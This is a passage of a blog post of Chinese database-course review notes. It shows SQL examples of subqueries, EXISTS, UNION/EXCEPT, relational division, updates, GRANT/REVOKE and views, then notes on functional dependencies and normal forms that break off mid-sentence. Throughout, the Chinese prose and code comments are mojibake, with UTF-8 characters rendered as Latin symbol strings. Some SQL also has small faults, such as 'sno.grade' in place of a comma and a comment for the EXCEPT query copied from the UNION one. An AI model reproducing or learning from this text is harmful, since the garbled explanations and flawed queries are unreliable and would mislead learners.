class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">//Êü•ËØ¢‰∏éÁéã‰∏ΩÂú®Âêå‰∏Ä‰∏™Â≠¶Èô¢Â≠¶‰π†ÁöÑÂ≠¶ÁîüÁöÑÂ≠¶Âè∑ÂíåÂßìÂêç</span><br><span class="line"><span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> Â≠¶Èô¢ <span class="keyword">IN</span>(</span><br><span class="line"><span class="keyword">select</span> Â≠¶Èô¢</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> sname=<span class="string">"Áéã‰∏Ω"</span></span><br><span class="line">)</span><br><span class="line">//Êü•ËØ¢Ê≤°ÊúâÈÄâ‰øÆÊï∞ÊçÆÂ∫ìÂéüÁêÜËØæÁ®ãÁöÑÂ≠¶ÁîüÁöÑÂ≠¶Âè∑ÂíåÂßìÂêç„ÄÇ</span><br><span class="line"><span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> sno <span class="keyword">NOT</span> <span class="keyword">IN</span>(</span><br><span class="line"><span class="keyword">select</span> sno</span><br><span class="line"><span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> cno <span class="keyword">IN</span>(</span><br><span class="line">    <span class="keyword">select</span> cno</span><br><span class="line">    <span class="keyword">from</span> c</span><br><span class="line">    <span class="keyword">where</span> cname=<span class="string">"Êï∞ÊçÆÂ∫ìÂéüÁêÜ"</span></span><br><span class="line">))</span><br><span class="line">//ÈõÜÂáΩÊï∞‰ΩúÁî®ÂØπË±°</span><br><span class="line">Êó†<span class="keyword">where</span>Â∞±ÊòØÊï¥Âº†Ë°®</span><br><span class="line">Êúâ<span class="keyword">where</span>Â∞±ÊòØË°å</span><br><span class="line">ÊúâÂàÜÁªÑÔºåÂ∞±ÊòØÂàÜÁªÑ</span><br><span class="line">//<span class="keyword">exists</span></span><br><span class="line"><span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> sc,c</span><br><span class="line"><span class="keyword">where</span> sc.cno=c.cno <span class="keyword">and</span> cname=<span class="string">"Êï∞ÊçÆÂ∫ìÂéüÁêÜ"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="3-7-ÈõÜÂêàÂíåÈô§ËøêÁÆó"><a href="#3-7-ÈõÜÂêàÂíåÈô§ËøêÁÆó" class="headerlink" title="3.7 ÈõÜÂêàÂíåÈô§ËøêÁÆó"></a>3.7 ÈõÜÂêàÂíåÈô§ËøêÁÆó</h2><p><strong>ÈõÜÂêàÊìç‰ΩúÁöÑÂêÑÊü•ËØ¢ÁªìÊûúÁöÑÂàóÊï∞ÂøÖÈ°ªÁõ∏ÂêåÔºåÂØπÂ∫îÈ°πÁöÑÊï∞ÊçÆÁ±ªÂûã‰πüÂøÖÈ°ªÁõ∏Âêå„ÄÇ</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">//Âπ∂ËøêÁÆó</span><br><span class="line">//Êü•ËØ¢ÈÄâ‰øÆ‰∫Ü180101Âè∑Êàñ180102Âè∑ËØæÁ®ãÊàñ‰∫åËÄÖÈÉΩÈÄâ‰øÆ‰∫ÜÁöÑÂ≠¶ÁîüÂ≠¶Âè∑„ÄÅËØæÁ®ãÂè∑ÂíåÊàêÁª©„ÄÇ</span><br><span class="line">(<span class="keyword">select</span> sno,cno,grade</span><br><span class="line"><span class="keyword">from</span> sc </span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">"180101"</span>)</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">(<span class="keyword">select</span> sno,cno,grade</span><br><span class="line"><span class="keyword">from</span> sc </span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">"180102"</span>);</span><br><span class="line">//Â∑ÆËøêÁÆó</span><br><span class="line">//Êü•ËØ¢ÈÄâ‰øÆ‰∫Ü180101Âè∑Êàñ180102Âè∑ËØæÁ®ãÊàñ‰∫åËÄÖÈÉΩÈÄâ‰øÆ‰∫ÜÁöÑÂ≠¶ÁîüÂ≠¶Âè∑„ÄÅËØæÁ®ãÂè∑ÂíåÊàêÁª©„ÄÇ</span><br><span class="line">(<span class="keyword">select</span> cno,sno,grade</span><br><span class="line"><span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">"180101"</span>)</span><br><span class="line"><span class="keyword">except</span></span><br><span class="line">(<span class="keyword">select</span> cno,sno.grade</span><br><span class="line"><span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">"180102"</span>);</span><br><span class="line">//Èô§ËøêÁÆó</span><br><span class="line">//‰∏≠Èó¥‰∏ÄÂ±Ç‰∏∫Â∞èÈõÜÂêàÔºåÊúÄÂÜÖ‰∏ÄÂ±Ç‰∏∫Â§ßÈõÜÂêà</span><br><span class="line">//Êü•ËØ¢‰∫ÜÈÄâ‰øÆÂÖ®ÈÉ®ËØæÁ®ãÁöÑÂßìÂêç</span><br><span class="line"><span class="keyword">select</span> sname</span><br><span class="line"><span class="keyword">from</span> s </span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line">    <span class="keyword">from</span> c </span><br><span class="line">    <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line">    <span class="keyword">select</span> * </span><br><span class="line">        <span class="keyword">from</span> sc </span><br><span class="line">    <span class="keyword">where</span> sc.cno=c.cno <span class="keyword">and</span> s.sno=sc.sno));</span><br><span class="line">//Êü•ËØ¢Ëá≥Â∞ëÈÄâ‰øÆ‰∫Ü091501Âè∑Â≠¶ÁîüÈÄâ‰øÆÁöÑÂÖ®ÈÉ®ËØæÁ®ãÁöÑÂ≠¶ÁîüÁöÑÂßìÂêç</span><br><span class="line"><span class="keyword">select</span> sname</span><br><span class="line"><span class="keyword">from</span> s</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> sc <span class="keyword">as</span> <span class="keyword">first</span></span><br><span class="line"> <span class="keyword">where</span> first.sno=<span class="string">"091501"</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line">     <span class="keyword">select</span> * </span><br><span class="line">        <span class="keyword">from</span> sc <span class="keyword">as</span> <span class="keyword">second</span></span><br><span class="line">     <span class="keyword">where</span> first.cno=second.cno <span class="keyword">and</span> second.sno=s.sno));</span><br></pre></td></tr></table></figure><h2 id="3-8-Êï∞ÊçÆÊõ¥Êñ∞ÂíåÊéßÂà∂"><a href="#3-8-Êï∞ÊçÆÊõ¥Êñ∞ÂíåÊéßÂà∂" class="headerlink" title="3.8 Êï∞ÊçÆÊõ¥Êñ∞ÂíåÊéßÂà∂"></a>3.8 Êï∞ÊçÆÊõ¥Êñ∞ÂíåÊéßÂà∂</h2><h3 id="Êõ¥Êñ∞"><a href="#Êõ¥Êñ∞" class="headerlink" title="Êõ¥Êñ∞"></a>Êõ¥Êñ∞</h3><ol><li>insert</li><li>update</li><li>delete</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">insert</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student</span><br><span class="line"><span class="keyword">values</span>(<span class="string">"xx"</span>,<span class="string">"xx"</span>,<span class="string">"xx"</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sc(sno,cno)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">"081010"</span>,<span class="string">"101"</span>);</span><br><span class="line"></span><br><span class="line">//<span class="keyword">update</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">table</span></span><br><span class="line"><span class="keyword">set</span> grade=grade+<span class="number">1</span></span><br><span class="line"><span class="keyword">where</span> sno <span class="keyword">in</span>(</span><br><span class="line"><span class="keyword">select</span> sno</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> Â≠¶Èô¢=<span class="string">"ËÆ°ÁÆóÊú∫"</span>);</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">table</span></span><br><span class="line"><span class="keyword">set</span> grade=grade+<span class="number">1</span></span><br><span class="line"><span class="keyword">where</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> *</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> Â≠¶Èô¢=<span class="string">"ËÆ°ÁÆóÊú∫"</span> <span class="keyword">and</span> s.sno=sc.sno);</span><br><span class="line"></span><br><span class="line">//<span class="keyword">delete</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">table</span></span><br><span class="line"><span class="keyword">where</span> sno=<span class="string">"101"</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line">    <span class="keyword">from</span> s</span><br><span class="line"><span class="keyword">where</span> sc.sno=s.sno <span class="keyword">and</span> Â≠¶Èô¢=<span class="string">"ËÆ°ÁÆóÊú∫"</span>)</span><br></pre></td></tr></table></figure><h3 id="ÊéßÂà∂"><a href="#ÊéßÂà∂" class="headerlink" title="ÊéßÂà∂"></a>ÊéßÂà∂</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">grant</span></span><br><span class="line">//ÊääÂ≠¶ÁîüË°®ÁöÑÊü•ËØ¢ÊùÉÈôêÊéà‰∫àÁî®Êà∑User1</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">select</span> <span class="keyword">on</span> <span class="keyword">table</span> student <span class="keyword">to</span> user1;</span><br><span class="line">//DBAÊääÂú®Êï∞ÊçÆÂ∫ìSMD‰∏≠Âª∫Á´ãË°®ÁöÑÊùÉÈôêÊéà‰∫àÁî®Êà∑User3„ÄÇ</span><br><span class="line"><span class="keyword">GRANT</span> createtab <span class="keyword">on</span> <span class="keyword">database</span> smd <span class="keyword">to</span> User3;</span><br><span class="line">//ÊääÂ≠¶‰π†Ë°®ÁöÑÂÖ®ÈÉ®ÊùÉÈôêÊéà‰∫àÂÖ®ÈÉ®Áî®Êà∑„ÄÇ</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> <span class="keyword">table</span> sc <span class="keyword">to</span> <span class="keyword">public</span>;</span><br><span class="line">//<span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>ÂèØ‰ª•ÊääÊùÉÈôêÊéà‰∫àÂÖ∂‰ªñ‰∫∫</span><br><span class="line">//ÊääÁî®Êà∑User6ÂØπÂ≠¶ÁîüË°®ÁöÑ<span class="keyword">INSERT</span>ÊùÉÈôêÊî∂Âõû</span><br><span class="line">//<span class="keyword">revoke</span> <span class="keyword">insert</span> <span class="keyword">on</span> <span class="keyword">table</span> student <span class="keyword">from</span> user6;</span><br></pre></td></tr></table></figure><h2 id="3-9-ËßÜÂõæ"><a href="#3-9-ËßÜÂõæ" class="headerlink" title="3.9 ËßÜÂõæ"></a>3.9 ËßÜÂõæ</h2><p>Ê¶ÇÂøµ:ËßÜÂõæÊòØ‰ªé‰∏Ä‰∏™ÊàñÂá†‰∏™Âü∫Êú¨Ë°®ÔºàÊàñËßÜÂõæ)ÂØºÂá∫ÁöÑË°®„ÄÇ</p><p>ËßÜÂõæ‰πüÁß∞‰∏∫ËôöË°®ÊàñËÄÖËôöÂÖ≥Á≥ª:Âè™Â≠òÊîæËßÜÂõæÁöÑÂÆö‰πâ„ÄÇ</p><h3 id="ÂÆö‰πâËßÜÂõæ"><a href="#ÂÆö‰πâËßÜÂõæ" class="headerlink" title="ÂÆö‰πâËßÜÂõæ"></a>ÂÆö‰πâËßÜÂõæ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span></span><br><span class="line">&lt;ËßÜÂõæÂêç&gt; [(&lt;ÂàóÂêç&gt; [Ôºå&lt;ÂàóÂêç&gt;]‚Ä¶)]</span><br><span class="line"><span class="keyword">AS</span> &lt;Â≠êÊü•ËØ¢&gt;</span><br><span class="line">[<span class="keyword">WITH</span> <span class="keyword">CHECK</span> <span class="keyword">OPTION</span>]Ôºõ</span><br><span class="line"></span><br><span class="line">//ËÆ°ÁÆóÊú∫Â≠¶Èô¢Â≠¶ÁîüÁöÑËßÜÂõæ</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> CS_STU</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> Â≠¶Èô¢=<span class="string">"ËÆ°ÁÆóÊú∫"</span>;</span><br></pre></td></tr></table></figure><h3 id="Âà†Èô§ËßÜÂõæ"><a href="#Âà†Èô§ËßÜÂõæ" class="headerlink" title="Âà†Èô§ËßÜÂõæ"></a>Âà†Èô§ËßÜÂõæ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> cs_stu</span><br></pre></td></tr></table></figure><h1 id="0x04-Á¨¨ÂõõÁ´†-ËßÑËåÉÂåñÁêÜËÆ∫"><a href="#0x04-Á¨¨ÂõõÁ´†-ËßÑËåÉÂåñÁêÜËÆ∫" class="headerlink" title="0x04 Á¨¨ÂõõÁ´† ËßÑËåÉÂåñÁêÜËÆ∫"></a>0x04 Á¨¨ÂõõÁ´† ËßÑËåÉÂåñÁêÜËÆ∫</h1><h2 id="4-1-ËßÑËåÉÂåñÊ¶ÇËø∞"><a href="#4-1-ËßÑËåÉÂåñÊ¶ÇËø∞" class="headerlink" title="4.1 ËßÑËåÉÂåñÊ¶ÇËø∞"></a>4.1 ËßÑËåÉÂåñÊ¶ÇËø∞</h2><h2 id="4-2-ÂáΩÊï∞‰æùËµñ"><a href="#4-2-ÂáΩÊï∞‰æùËµñ" class="headerlink" title="4.2 ÂáΩÊï∞‰æùËµñ"></a>4.2 ÂáΩÊï∞‰æùËµñ</h2><p>XÁõ∏Á≠âÔºåY‰∏ÄÂÆöÁõ∏Á≠â„ÄÇËã•X‰∏çÁ≠âÔºåYÂèØÁ≠âÂèØ‰∏çÁ≠â„ÄÇ</p><p><img src="/2021/05/03/Database-review/image-20210506211418905.png" alt="image-20210506211418905"></p><p>Â¶ÇÊûúX‚ÜíYÔºå‰ΩÜY‰∏ç‰∏∫XÁöÑÂ≠êÈõÜÔºåÂàôÁß∞X‚ÜíYÊòØ<strong>ÈùûÂπ≥Âá°ÁöÑÂáΩÊï∞‰æùËµñ</strong></p><p>Ëã•X‚ÜíYÔºå‰ΩÜYÂ±û‰∫éX, ÂàôÁß∞X‚ÜíYÊòØ<strong>Âπ≥Âá°ÁöÑÂáΩÊï∞‰æùËµñ</strong></p><h3 id="ÂÆåÂÖ®ÂáΩÊï∞‰æùËµñÔºö"><a href="#ÂÆåÂÖ®ÂáΩÊï∞‰æùËµñÔºö" class="headerlink" title="ÂÆåÂÖ®ÂáΩÊï∞‰æùËµñÔºö"></a><strong>ÂÆåÂÖ®ÂáΩÊï∞‰æùËµñ</strong>Ôºö<img src="/2021/05/03/Database-review/20190629193601651.png" alt="img"></h3><h3 id="ÈÉ®ÂàÜÂáΩÊï∞‰æùËµñÔºö"><a href="#ÈÉ®ÂàÜÂáΩÊï∞‰æùËµñÔºö" class="headerlink" title="ÈÉ®ÂàÜÂáΩÊï∞‰æùËµñÔºö"></a>ÈÉ®ÂàÜÂáΩÊï∞‰æùËµñÔºö<img src="/2021/05/03/Database-review/20190629193601806.png" alt="img"></h3><p><img src="/2021/05/03/Database-review/20190629193609721.png" alt="img"></p><p>‰∏äÂõæ‰∏≠<img src="/2021/05/03/Database-review/20190629193615156.png" alt="img"> ÊòØÂÆåÂÖ®ÂáΩÊï∞‰æùËµñÔºå</p><p><img src="/2021/05/03/Database-review/20190629193615144.png" alt="img"> ÊòØÈÉ®ÂàÜÊï∞‰æùËµñÔºåÂõ†‰∏∫Sno‚ÜíSdeptÊàêÁ´ãÔºåËÄåSnoÊòØSnoÔºåCnoÁöÑÁúüÂ≠êÈõÜ</p><h3 id="‰º†ÈÄíÂáΩÊï∞‰æùËµñ"><a href="#‰º†ÈÄíÂáΩÊï∞‰æùËµñ" class="headerlink" title="‰º†ÈÄíÂáΩÊï∞‰æùËµñ"></a><strong>‰º†ÈÄíÂáΩÊï∞‰æùËµñ</strong></h3><p>ÂÆö‰πâ:Âú®R(U)‰∏≠ÔºåÂ¶ÇÊûúX‚ÜíYÔºåY‰∏çÂåÖÂê´‰∫éXÂç≥Y‰∏çÊòØXÁöÑÂ≠êÈõÜÔºåY‰∏ç‚ÜíXÔºåY‚ÜíZ,ÂàôÁß∞ZÂØπX‰º†ÈÄíÂáΩÊï∞‰æùËµñ„ÄÇ</p><h3 id="Á†ÅÁöÑÂáΩÊï∞‰æùËµñÂÆö‰πâ"><a href="#Á†ÅÁöÑÂáΩÊï∞‰æùËµñÂÆö‰πâ" class="headerlink" title="Á†ÅÁöÑÂáΩÊï∞‰æùËµñÂÆö‰πâ"></a>Á†ÅÁöÑÂáΩÊï∞‰æùËµñÂÆö‰πâ</h3><p><strong>ÂÄôÈÄâÁ†ÅÂíå‰∏ªÁ†Å</strong></p><p><img src="/2021/05/03/Database-review/image-20210506215255533.png" alt="image-20210506215255533"></p><p><strong>‰∏ªÂ±ûÊÄßÂíåÈùû‰∏ªÂ±ûÊÄß</strong></p><p><img src="/2021/05/03/Database-review/image-20210506215233325.png" alt="image-20210506215233325"></p><p><strong>Â§ñÁ†Å</strong><img src="/2021/05/03/Database-review/image-20210506215400654.png" alt="image-20210506215400654"></p><p><strong>Ë∂ÖÁ†Å</strong></p><p><img src="/2021/05/03/Database-review/image-20210506215557064.png" alt="image-20210506215557064"></p><h2 id="4-3-ËåÉÂºè"><a href="#4-3-ËåÉÂºè" class="headerlink" title="4.3 ËåÉÂºè"></a>4.3 ËåÉÂºè</h2><h3 id="1NF"><a href="#1NF" class="headerlink" title="1NF"></a>1NF</h3><p>Â¶ÇÊûú‰∏ÄÂÖ≥Á≥ªÊ®°Âºèr(R)ÁöÑÊØè‰∏™Â±ûÊÄßÂØπÂ∫îÁöÑÂüüÂÄºÈÉΩÊòØ‰∏çÂèØÂàÜÁöÑ(Âç≥ÂéüÂ≠êÁöÑ)ÔºåÂàôÁß∞r(R)Â±û‰∫éÁ¨¨‰∏ÄËåÉÂºèÔºåËÆ∞‰∏∫r(R)√é1NF.</p><p>Á¨¨‰∏ÄËåÉÂºèÁöÑÁõÆÊ†áÊòØÔºöÂ∞ÜÂü∫Êú¨Êï∞ÊçÆÂàíÂàÜÊàêÁß∞‰∏∫ÂÆû‰ΩìÈõÜÊàñË°®ÁöÑÈÄªËæëÂçïÂÖÉÔºåÂΩìËÆæËÆ°Â•ΩÊØè‰∏™ÂÆû‰ΩìÂêéÔºåÈúÄË¶Å‰∏∫ÂÖ∂ÊåáÂÆö‰∏ªÁ†Å„ÄÇ</p><p><img src="/2021/05/03/Database-review/20190629193650963.png" alt="img"></p><p>Á¨¨‰∏ÄËåÉÂºèÊòØÂØπÂÖ≥Á≥ªÊ®°ÂºèÁöÑÊúÄËµ∑Á†ÅÁöÑË¶ÅÊ±Ç„ÄÇ‰∏çÊª°Ë∂≥Á¨¨‰∏ÄËåÉÂºèÁöÑÊï∞ÊçÆÂ∫ìÊ®°Âºè‰∏çËÉΩÁß∞‰∏∫ÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ì</p><h3 id="2NF"><a href="#2NF" class="headerlink" title="2NF"></a>2NF</h3><p>Ëã•ÂÖ≥Á≥ªÊ®°ÂºèR‚àà1NFÔºåÂπ∂‰∏îÊØè‰∏Ä‰∏™Èùû‰∏ªÂ±ûÊÄßÈÉΩÂÆåÂÖ®ÂáΩÊï∞‰æùËµñ‰∫é‰ªª‰Ωï‰∏Ä‰∏™ÂÄôÈÄâÁ†ÅÔºåÂàôR‚àà2NF„ÄÇ</p><p>Á¨¨‰∫åËåÉÂºèÁöÑÁõÆÊ†áÔºöÂ∞ÜÂè™ÈÉ®ÂàÜ‰æùËµñ‰∫éÂÄôÈÄâÁ†ÅÔºàÂç≥‰æùËµñ‰∫éÂÄôÈÄâÁ†ÅÁöÑÈÉ®ÂàÜÂ±ûÊÄßÔºâÁöÑÈùû‰∏ªÂ±ûÊÄßÁßªÂà∞ÂÖ∂‰ªñË°®‰∏≠„ÄÇ</p><p>S-L-CËøô‰∏™ÂáΩÊï∞‰æùËµñÂõæ‰∏≠Èùû‰∏ªÂ±ûÊÄßSdeptÂíåSlocÈÉ®ÂàÜÂáΩÊï∞‰æùËµñ‰∫éÁ†Å(Sno, Cno)</p><p><img src="/2021/05/03/Database-review/20190629193705542.png" alt="img"></p><p>Â∞ÜÂÖ∂ÂàÜ‰∏∫‰∏§‰∏™Ë°®Âêé‰ΩøÂæóÈùû‰∏ªÂ±ûÊÄßÂØπÂÖ∂ÂêÑËá™ÁöÑÁ†ÅÈÉΩÊòØÂÆåÂÖ®ÂáΩÊï∞‰æùËµñ</p><p><img src="/2021/05/03/Database-review/20190629193713265.png" alt="img"></p><p>2NFËåÉÂºèËôΩÁÑ∂Ê∂àÈô§‰∫ÜÁî±‰∫éÈùû‰∏ªÂ±ûÊÄßÂØπÂÄôÈÄâÁ†ÅÁöÑÈÉ® ÂàÜ‰æùËµñÊâÄÂºïËµ∑ÁöÑÂÜó‰ΩôÂèäÂêÑÁßçÂºÇÂ∏∏Ôºå‰ΩÜÂπ∂Ê≤°ÊúâÊéíÈô§‰º†ÈÄí‰æùËµñ„ÄÇÂõ†Ê≠§ÔºåËøòÈúÄË¶ÅÂØπÂÖ∂Ëøõ‰∏ÄÊ≠•ËßÑËåÉÂåñ</p><h3 id="3NF"><a href="#3NF" class="headerlink" title="3NF"></a>3NF</h3><p><strong>3NFÂøÖÂÆöÊòØ2NF</strong></p><p>Ëã•R‚àà3NFÔºåÂàôÊØè‰∏Ä‰∏™Èùû‰∏ªÂ±ûÊÄßÊó¢‰∏çÈÉ®ÂàÜ‰æùËµñ‰∫éÁ†Å‰πü‰∏ç‰º†ÈÄí‰æùËµñ‰∫éÁ†Å</p><p>Á¨¨‰∏âËåÉÂºèÁöÑÁõÆÊ†áÔºöÂéªÊéâË°®‰∏≠‰∏çÁõ¥Êé•‰æùËµñ‰∫éÂÄôÈÄâÁ†ÅÁöÑÈùû‰∏ªÂ±ûÊÄß</p><p><img src="/2021/05/03/Database-review/20190629193726860.png" alt="img"></p><p>Sno‚ÜíSdept  Sdept ‚Üí Sno  Sdept‚ÜíSloc ÂèØÂæóÔºö Sno‚ÜíSlocÔºåÂç≥S-L‰∏≠Â≠òÂú®Èùû‰∏ªÂ±ûÊÄßÂØπÁ†ÅÁöÑ‰º†ÈÄíÂáΩÊï∞‰æù ËµñÔºåS-L ‚àâ 3NF</p><p>ÈááÁî®ÊäïÂΩ±ÂàÜËß£Ê≥ïÔºåÊääS-LÂàÜËß£‰∏∫‰∏§‰∏™ÂÖ≥Á≥ªÊ®°ÂºèÔºå‰ª•Ê∂àÈô§‰º†ÈÄíÂáΩÊï∞‰æùËµñÔºö</p><p><img src="/2021/05/03/Database-review/20190629193735197.png" alt="img"></p><p>eg:</p><ol><li>ÂÖàÊâæË∞ÅËÉΩÂÜ≥ÂÆöU</li><li>‰πãÂêéÁúãÊòØÂê¶ÊúâÈÉ®ÂàÜÂáΩÊï∞‰æùËµñ(1NF,2NF)</li><li>ÊúÄÂêéÁúãÊòØÂê¶Êúâ‰º†ÈÄíÂáΩÊï∞‰æùËµñ(2NF,3NF)</li></ol><h2 id="4-4-BCNF-4NF"><a href="#4-4-BCNF-4NF" class="headerlink" title="4.4 BCNF 4NF"></a>4.4 BCNF 4NF</h2><h3 id="BCNF"><a href="#BCNF" class="headerlink" title="BCNF"></a>BCNF</h3><p>ÈÄöÂ∏∏ËÆ§‰∏∫BCNFÊòØ‰øÆÊ≠£ÁöÑÁ¨¨‰∏âËåÉÂºèÔºåÊúâÊó∂‰πüÁß∞‰∏∫Êâ©ÂÖÖÁöÑÁ¨¨‰∏âËåÉÂºè„ÄÇ</p><p>‰∏Ä‰∏™Êª°Ë∂≥BCNFÁöÑÂÖ≥Á≥ªÊ®°ÂºèÊúâÔºö</p><p>ÊâÄÊúâÈùû‰∏ªÂ±ûÊÄßÈÉΩÂÆåÂÖ®ÂáΩÊï∞‰æùËµñ‰∫éÊØè‰∏™ÂÄôÈÄâÁ†Å<br>ÊâÄÊúâÁöÑ‰∏ªÂ±ûÊÄßÈÉΩÂÆåÂÖ®ÂáΩÊï∞‰æùËµñ‰∫éÊØè‰∏™‰∏çÂåÖÂê´ÂÆÉÁöÑÂÄôÈÄâÁ†Å<br>Ê≤°Êúâ‰ªª‰ΩïÂ±ûÊÄßÂÆåÂÖ®ÂáΩÊï∞‰æùËµñ‰∫éÈùûÁ†ÅÁöÑ‰ªª‰Ωï‰∏ÄÁªÑÂ±ûÊÄß<br>BCNFËåÉÂºèÊéíÈô§‰∫ÜÔºö</p><p>‰ªª‰ΩïÂ±ûÊÄß(ÂåÖÊã¨‰∏ªÂ±ûÊÄßÂíåÈùû‰∏ªÂ±ûÊÄß)ÂØπÂÄôÈÄâÁ†ÅÁöÑÈÉ®ÂàÜ‰æùËµñÂíå‰º†ÈÄí‰æùËµñÔºõ<br>‰∏ªÂ±ûÊÄß‰πãÈó¥ÁöÑ‰º†ÈÄí‰æùËµñ„ÄÇ<br>‰æãÂ≠êÔºö</p><p>ÂÖ≥Á≥ªÊ®°ÂºèSTJ(S,T,J)‰∏≠ÔºåSË°®Á§∫Â≠¶ÁîüÔºåTË°®Á§∫ÊïôÂ∏àÔºåJË°®Á§∫ËØæÁ®ã„ÄÇÊØè‰∏ÄÊïôÂ∏àÂè™Êïô‰∏ÄÈó®ËØæÔºå</p><p>ÊØèÈó®ËØæÊúâËã•Âπ≤ÊïôÂ∏àÔºåÊüê‰∏ÄÂ≠¶ÁîüÈÄâÂÆöÊüêÈó®ËØæÔºåÂ∞±ÂØπÂ∫î‰∏Ä‰∏™Âõ∫ÂÆöÁöÑÊïôÂ∏à„ÄÇ</p><p>Áî±ËØ≠‰πâÂèØÂæóÂà∞ÂáΩÊï∞‰æùËµñÔºö(S,J)‚ÜíTÔºõ(S,T)‚ÜíJÔºõT‚ÜíJ</p><p>Âõ†‰∏∫Ê≤°Êúâ‰ªª‰ΩïÈùû‰∏ªÂ±ûÊÄßÂØπÁ†Å‰º†ÈÄí‰æùËµñÊàñÈÉ®ÂàÜ‰æùËµñÔºå</p><p>STJ ‚àà 3NF„ÄÇ</p><p>Âõ†‰∏∫TÊòØÂÜ≥ÂÆöÂõ†Á¥†ÔºåËÄåT‰∏çÂåÖÂê´Á†ÅÔºåÊâÄ‰ª•STJ 